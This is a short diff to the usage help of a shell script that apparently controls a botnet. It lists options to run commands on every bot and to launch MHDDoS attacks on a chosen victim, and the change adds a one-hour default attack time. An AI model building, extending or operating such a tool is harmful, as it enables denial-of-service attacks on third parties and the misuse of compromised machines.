@@ -14,7 +14,7 @@ usage()
 	printf "$fmt" "-r, -C, --command <cmd>" "Command to run on each bot."
 	printf "$fmt" "--attack <Layer:attack>" "Run this MHDDoS attack on bots"
 	printf "$fmt" "--victim <victim_spec>" "Victim specification, like in MHDDoS."
-	printf "$fmt" "--time <seconds>" "Attack time frame length in seconds."
+	printf "$fmt" "--time <seconds>" "Attack time frame length in seconds. Default is 1 hour."
 	printf "$fmt" "-T, --threads" "Count of attack threads on each bot"
 	printf "$fmt" "-l, --list" "List bots in selected botnet."
 	printf "$fmt" "--async" "Launch things asynchronously."
